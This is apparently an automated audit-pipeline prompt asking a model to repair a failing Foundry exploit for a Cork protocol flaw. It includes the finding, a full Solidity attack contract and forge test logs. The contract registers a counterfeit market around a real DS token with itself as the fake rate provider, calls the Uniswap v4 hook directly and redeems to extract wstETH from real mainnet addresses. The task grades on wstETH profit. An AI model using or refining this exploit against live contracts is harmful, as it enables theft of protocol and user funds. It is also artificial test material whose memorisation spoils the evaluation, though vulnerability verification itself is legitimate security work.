You are fixing a failing Foundry PoC for finding F-001.

Goal:
- Keep the exploit objective for this finding.
- Fix compile/runtime/test failure from logs.
- Return COMPLETE updated Solidity for `src/FlawVerifier.sol` only.
- Keep exploit logic aligned with the full `Exploit paths` list unless logs prove a stage is infeasible.
- Additional realistic public on-chain economic steps are allowed when required for execution (including flashloans/swaps/mint/burn), but keep the same exploit causality and justify in comments.

Hard constraints:
- Do NOT use external answers/PoCs/articles/repos (including DeFiHackLabs).
- Do NOT cheat: no vm.deal, vm.store, vm.etch, vm.mockCall, vm.prank, vm.startPrank, arbitrary balance injection, or arbitrary storage writes.
- Allowed: flashloans and realistic public on-chain actions.
- Work only from finding context (claim/paths/locations) + on-chain state context already provided in this workspace.
- Hard anti-cheat: profitToken MUST NOT be a token deployed during this PoC/test. Profit token must already exist on-chain at the fork block.
- Hard anti-cheat: do not deploy custom ERC20/token contracts to manufacture profit accounting.

Attempt strategy (must follow for this attempt):
- strategy_label: v2_flashswap_funding
- strategy_instructions: Prefer UniswapV2/Sushi-like flashswap funding with deterministic repayment and minimal route complexity.
- Keep exploit root cause and `Exploit paths` unchanged; only vary funding/execution implementation details.

Finding:
- title: Permissionless market creation lets attackers register arbitrary redemption assets and exchange-rate providers
- claim: `CorkConfig.initializeModuleCore` and `CorkConfig.issueNewDs` are externally callable without a manager/admin check, while `ModuleCore.initializeModuleCore` accepts arbitrary `pa`, `ra`, and `exchangeRateProvider` values and `issueNewDs` later trusts that stored provider via `PsmLibrary._getLatestRate(state)`. This allows any user to permissionlessly create and roll over a fake market whose redemption asset is a real protocol token (for example, a live DS series) and whose exchange-rate provider is attacker-controlled.
- impact: An attacker can spin up counterfeit Cork markets around valuable protocol-held assets, mint fake CT/DS against those assets under attacker-chosen pricing, and use the resulting instruments in swaps or redemptions to steal reserve assets or drain protocol liquidity.
- exploit_paths: ["attacker -> CorkConfig.initializeModuleCore(pa, realDS, initialArp, expiryInterval, attackerRateProvider)", "attacker -> ModuleCore.getId(...) / CorkConfig.issueNewDs(id, ...)", "protocol -> ModuleCore.issueNewDs() -> PsmLibrary._getLatestRate(state) using attacker-controlled exchangeRateProvider", "attacker uses fake-market CT/DS as inputs to subsequent swap/redemption flows"]

Current FlawVerifier.sol:
```solidity
pragma solidity 0.8.26;

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
}

interface ICorkConfig {
    function issueNewDs(bytes32 id, uint256 dsExpiry) external;
    function initializeModuleCore(address pa, address ra, uint256 initialArp, uint256 expiryInterval, address exchangeRateProvider) external;
}

interface IModuleCoreProxy {
    function returnRaWithCtDs(bytes32 id, uint256 amount) external returns (uint256);
    function depositPsm(bytes32 id, uint256 amount) external returns (uint256, uint256);
    function depositLv(bytes32 id, uint256 amount, uint256 minCt, uint256 minDs, uint256 minLv, uint256 deadline) external returns (uint256);
    function getId(address pa, address ra, uint256 initialArp, uint256 expiryInterval, address exchangeRateProvider) external returns (bytes32);
}

interface ISwapAssetRegistry {
    function getDeployedSwapAssets(
        address pa,
        address ra,
        uint256 initialArp,
        uint256 expiryInterval,
        address exchangeRateProvider,
        uint8 start,
        uint8 end
    ) external returns (address[] memory ct, address[] memory ds);
}

struct PoolKey {
    address currency0;
    address currency1;
    uint24 fee;
    int24 tickSpacing;
    address hooks;
}

struct SwapParams {
    bool zeroForOne;
    int256 amountSpecified;
    uint160 sqrtPriceLimitX96;
}

interface ICorkHook {
    function swap(address tokenIn, address tokenOut, uint256 amountIn, uint256 minOut, bytes calldata data) external returns (uint256);
    function getReserves(address tokenA, address tokenB) external returns (uint256, uint256);
    function beforeSwap(address sender, PoolKey calldata key, SwapParams calldata params, bytes calldata data) external returns (bytes4, int256, uint24);
}

interface IPoolManager {
    function unlock(bytes calldata data) external returns (bytes memory);
    function settleFor(address recipient) external returns (uint256);
    function sync(address currency) external;
}

contract FlawVerifier {
    address internal constant TARGET_PROXY = 0xCCd90F6435dd78C4ECCED1FA4db0D7242548a2a9;
    address internal constant LIQUIDITY_TOKEN = 0x05816980fAEC123dEAe7233326a1041f372f4466;
    address internal constant WSTETH = 0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0;
    address internal constant SWAP_ASSET_REGISTRY = 0x96E0121D1cb39a46877aaE11DB85bc661f88D5fA;
    address internal constant CORK_CONFIG = 0xF0DA8927Df8D759d5BA6d3d714B1452135D99cFC;
    address internal constant CORK_HOOK = 0x5287E8915445aee78e10190559D8Dd21E0E9Ea88;
    address internal constant POOL_MANAGER = 0x000000000004444c5dc75cB358380D2e3dE08A90;
    address internal constant LEGIT_PA = 0xCd5fE23C85820F7B72D0926FC9b05b43E359b7ee;
    address internal constant LEGIT_RATE_PROVIDER = 0x7b285955DdcbAa597155968f9c4e901bb4c99263;
    address internal constant FAKE_MARKET_PROXY = 0x55B90B37416DC0Bd936045A8110d1aF3B6Bf0fc3;

    bytes32 internal constant LEGIT_MARKET_ID = 0x6b1d373ba0974d7e308529a62e41cec8bac6d71a57a1ba1b5c5bf82f6a9ea07a;
    uint160 internal constant MIN_SQRT_RATIO_PLUS_ONE = 79228162514264337593543950336;

    uint256 internal _profitAmount;
    uint256 internal _startingWstEth;
    bool public executed;
    uint256 public lastStage;

    constructor() {}

    function executeOnOpportunity() public {
        if (executed) {
            _updateProfit();
            return;
        }
        executed = true;
        _startingWstEth = IERC20(WSTETH).balanceOf(address(this));
        _profitAmount = 0;

        uint256 liquidityTokenBalance = IERC20(LIQUIDITY_TOKEN).balanceOf(address(this));
        uint256 wstEthBalance = _startingWstEth;

        // Concrete fork-state precondition for this direct-execution attempt:
        // the verifier must already hold real on-chain funding. The historical exploit path
        // used attacker-held LiquidityToken + wstETH and did not manufacture either asset.
        if (liquidityTokenBalance == 0 || wstEthBalance == 0) {
            lastStage = 1;
            return;
        }

        lastStage = 2;
        _safeTransfer(LIQUIDITY_TOKEN, TARGET_PROXY, liquidityTokenBalance);

        lastStage = 3;
        (address[] memory legitCtSeries, address[] memory legitDsSeries) = ISwapAssetRegistry(SWAP_ASSET_REGISTRY)
            .getDeployedSwapAssets(WSTETH, LEGIT_PA, uint256(493150684700) * 1e6, 7776001, LEGIT_RATE_PROVIDER, 0, 7);

        if (legitCtSeries.length < 2 || legitDsSeries.length < 2) {
            lastStage = 4;
            return;
        }

        address legitCt = legitCtSeries[1];
        address realDs = legitDsSeries[1];

        lastStage = 5;
        (, uint256 ctReserve) = ICorkHook(CORK_HOOK).getReserves(WSTETH, legitCt);
        IERC20(WSTETH).approve(CORK_HOOK, type(uint256).max);
        IERC20(legitCt).approve(CORK_HOOK, type(uint256).max);
        ICorkHook(CORK_HOOK).swap(WSTETH, legitCt, 0, (ctReserve * 9999) / 10000, "");

        lastStage = 6;
        IERC20(WSTETH).approve(TARGET_PROXY, type(uint256).max);
        IModuleCoreProxy(TARGET_PROXY).depositPsm(LEGIT_MARKET_ID, 4e15);

        // Path stage 1: permissionless creation of counterfeit market using a real DS as RA
        // and this contract as attacker-controlled rate provider.
        lastStage = 7;
        ICorkConfig(CORK_CONFIG).initializeModuleCore(WSTETH, realDs, 1, 100, address(this));

        // Path stage 2 + 3: derive fake-market id and trigger DS issuance, which causes protocol
        // code to trust the attacker-controlled exchange rate provider via rate(bytes32).
        lastStage = 8;
        bytes32 fakeMarketId = IModuleCoreProxy(TARGET_PROXY).getId(WSTETH, realDs, 1, 100, address(this));
        ICorkConfig(CORK_CONFIG).issueNewDs(fakeMarketId, block.timestamp * 10);

        // Path stage 4: use fake-market CT/DS instruments in subsequent liquidity/swap/redemption flows.
        lastStage = 9;
        (address[] memory fakeCtSeries, address[] memory fakeDsSeries) = ISwapAssetRegistry(SWAP_ASSET_REGISTRY)
            .getDeployedSwapAssets(realDs, WSTETH, 1, 100, address(this), 0, 1);

        if (fakeCtSeries.length == 0 || fakeDsSeries.length == 0) {
            lastStage = 10;
            return;
        }

        address fakeCt = fakeCtSeries[0];
        address fakeDs = fakeDsSeries[0];

        uint256 realDsBalance = IERC20(realDs).balanceOf(address(this));
        if (realDsBalance == 0) {
            lastStage = 11;
            return;
        }

        lastStage = 12;
        IERC20(realDs).approve(TARGET_PROXY, type(uint256).max);
        IModuleCoreProxy(TARGET_PROXY).depositLv(fakeMarketId, realDsBalance / 2, 0, 0, 0, block.timestamp * 10);

        lastStage = 13;
        IPoolManager(POOL_MANAGER).unlock(abi.encode(realDs, fakeCt, fakeMarketId, fakeDs));

        lastStage = 14;
        uint256 legitCtBalance = IERC20(legitCt).balanceOf(address(this));
        IERC20(legitCt).approve(TARGET_PROXY, type(uint256).max);
        IERC20(realDs).approve(TARGET_PROXY, type(uint256).max);
        IModuleCoreProxy(TARGET_PROXY).returnRaWithCtDs(LEGIT_MARKET_ID, legitCtBalance);

        lastStage = 15;
        IERC20(WSTETH).approve(TARGET_PROXY, 0);
        IERC20(WSTETH).approve(CORK_HOOK, 0);
        IERC20(WSTETH).approve(FAKE_MARKET_PROXY, 0);
        IERC20(realDs).approve(TARGET_PROXY, 0);
        IERC20(legitCt).approve(TARGET_PROXY, 0);
        _updateProfit();
    }

    function unlockCallback(bytes calldata data) external returns (bytes memory) {
        if (msg.sender != POOL_MANAGER) {
            return bytes("");
        }

        (address realDs, address fakeCt, bytes32 fakeMarketId, address fakeDs) = abi.decode(data, (address, address, bytes32, address));
        uint256 realDsInProxy = IERC20(realDs).balanceOf(FAKE_MARKET_PROXY);

        lastStage = 131;
        IPoolManager(POOL_MANAGER).sync(fakeCt);

        PoolKey memory key = PoolKey({
            currency0: fakeCt,
            currency1: realDs,
            fee: 0,
            tickSpacing: 1,
            hooks: address(this)
        });

        bytes memory hookData = abi.encode(uint256(1), address(this), uint256(0), realDsInProxy, fakeMarketId, uint256(1));
        _delegateBeforeSwap(FAKE_MARKET_PROXY, key, SwapParams({
            zeroForOne: true,
            amountSpecified: 100000000000000,
            sqrtPriceLimitX96: MIN_SQRT_RATIO_PLUS_ONE
        }), hookData);

        lastStage = 132;
        IERC20(fakeCt).approve(POOL_MANAGER, 123);
        _safeTransfer(fakeCt, POOL_MANAGER, 110987905101460);
        uint256 settled = IPoolManager(POOL_MANAGER).settleFor(CORK_HOOK);

        lastStage = 133;
        _delegateBeforeSwap(FAKE_MARKET_PROXY, key, SwapParams({
            zeroForOne: false,
            amountSpecified: _toInt256(settled),
            sqrtPriceLimitX96: MIN_SQRT_RATIO_PLUS_ONE
        }), hex"");

        lastStage = 134;
        IERC20(fakeDs).approve(TARGET_PROXY, type(uint256).max);
        IERC20(fakeCt).approve(TARGET_PROXY, type(uint256).max);
        uint256 fakeCtBalance = IERC20(fakeCt).balanceOf(address(this));
        IModuleCoreProxy(TARGET_PROXY).returnRaWithCtDs(fakeMarketId, fakeCtBalance);

        lastStage = 135;
        IPoolManager(POOL_MANAGER).sync(realDs);
        _safeTransfer(realDs, POOL_MANAGER, 1);
        IPoolManager(POOL_MANAGER).settleFor(CORK_HOOK);

        return hex"";
    }

    function _delegateBeforeSwap(address sender, PoolKey memory key, SwapParams memory params, bytes memory data) internal {
        (bool success, ) = CORK_HOOK.call(abi.encodeWithSelector(ICorkHook.beforeSwap.selector, sender, key, params, data));
        if (!success) {
            lastStage = 200;
        }
    }

    function _updateProfit() internal {
        uint256 current = IERC20(WSTETH).balanceOf(address(this));
        if (current > _startingWstEth) {
            _profitAmount = current - _startingWstEth;
        } else {
            _profitAmount = 0;
        }
    }

    function _safeTransfer(address token, address to, uint256 amount) internal {
        require(IERC20(token).transfer(to, amount), "TRANSFER_FAILED");
    }

    function _toInt256(uint256 value) internal pure returns (int256) {
        require(value <= uint256(type(int256).max), "INT_OVERFLOW");
        // forge-lint: disable-next-line(unsafe-typecast)
        return int256(value);
    }

    function rate() external pure returns (uint256) {
        return 0;
    }

    function rate(bytes32) external pure returns (uint256) {
        return 1;
    }

    function profitToken() external pure returns (address) {
        return WSTETH;
    }

    function profitAmount() external view returns (uint256) {
        return _profitAmount;
    }
}

```

forge stdout (tail):
```
Compiling 2 files with Solc 0.8.26
Solc 0.8.26 finished in 10.23s
Compiler run successful with warnings:
Warning (2072): Unused local variable.
  --> test/ExploitPOC.t.sol:68:19:
   |
68 |         (bool ok, bytes memory ret) = address(verifier).call(abi.encodeWithSignature("executeOnOpportunity()"));
   |                   ^^^^^^^^^^^^^^^^


Ran 1 test for test/ExploitPOC.t.sol:FlawVerifierTest
[FAIL: profit below threshold] testExploit() (gas: 97415)
Logs:
  AUDITHOUND_BALANCE_BEFORE_WEI: 577021548053172
  AUDITHOUND_BALANCE_AFTER_WEI: 577021548053172
  AUDITHOUND_PROFIT_WEI: 0
  AUDITHOUND_PROFIT_ANY: 0
  AUDITHOUND_EFFECTIVE_PROFIT_WEI: 0
  AUDITHOUND_MIN_PROFIT_WEI: 100000000000000000
  AUDITHOUND_PROFIT_TOKEN: 0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0
  AUDITHOUND_PROFIT_MODE: 0x0000000000000000000000000000000000000001
  AUDITHOUND_PROFIT_TOKEN_CODE_SIZE_ON_FORK: 6492

Traces:
  [97415] FlawVerifierTest::testExploit()
    ├─ [273] FlawVerifier::profitToken() [staticcall]
    │   └─ ← [Return] 0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0
    ├─ [2534] 0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   └─ ← [Return] 0
    ├─ [58172] FlawVerifier::executeOnOpportunity()
    │   ├─ [534] 0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [5300] 0x05816980fAEC123dEAe7233326a1041f372f4466::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   │   ├─ [2628] 0x083c322aDa898F880a1d0a959A6e69081B82E5bc::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [delegatecall]
    │   │   │   └─ ← [Return] 0
    │   │   └─ ← [Return] 0
    │   └─ ← [Stop]
    ├─ [273] FlawVerifier::profitToken() [staticcall]
    │   └─ ← [Return] 0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0
    ├─ [534] 0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   └─ ← [Return] 0
    ├─ emit log_named_uint(key: "AUDITHOUND_BALANCE_BEFORE_WEI", val: 577021548053172 [5.77e14])
    ├─ emit log_named_uint(key: "AUDITHOUND_BALANCE_AFTER_WEI", val: 577021548053172 [5.77e14])
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_ANY", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_EFFECTIVE_PROFIT_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_MIN_PROFIT_WEI", val: 100000000000000000 [1e17])
    ├─ emit log_named_address(key: "AUDITHOUND_PROFIT_TOKEN", val: 0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0)
    ├─ emit log_named_address(key: "AUDITHOUND_PROFIT_MODE", val: ECRecover: [0x0000000000000000000000000000000000000001])
    ├─ [0] VM::envString("AUDITHOUND_RPC_URL")
    │   └─ ← [Return] <env var value>
    ├─ [0] VM::createSelectFork("<rpc url>", 22581019 [2.258e7])
    │   └─ ← [Return] 1
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_TOKEN_CODE_SIZE_ON_FORK", val: 6492)
    └─ ← [Revert] profit below threshold

Backtrace:
  at FlawVerifierTest.testExploit

Suite result: FAILED. 0 passed; 1 failed; 0 skipped; finished in 1.26s (578.69ms CPU time)

Ran 1 test suite in 1.26s (1.26s CPU time): 0 tests passed, 1 failed, 0 skipped (1 total tests)

Failing tests:
Encountered 1 failing test in test/ExploitPOC.t.sol:FlawVerifierTest
[FAIL: profit below threshold] testExploit() (gas: 97415)

Encountered a total of 1 failing tests, 0 tests succeeded

Tip: Run `forge test --rerun` to retry only the 1 failed test

```

forge stderr (tail):
```

```

Requirements:
1. pragma ^0.8.20
2. include at least one deployable contract with zero-arg constructor
3. define fixed entry `executeOnOpportunity()` as no-arg external/public exploit function
4. no imports
5. keep exploit logic aligned to exploit_paths (same core actions and ordering intent)
6. expose `profitToken()` and `profitAmount()` getters for net realized profit
7. additional realistic public on-chain economic steps are allowed when required for execution, but keep exploit_paths core causality and justify in comments
8. output ONLY Solidity code
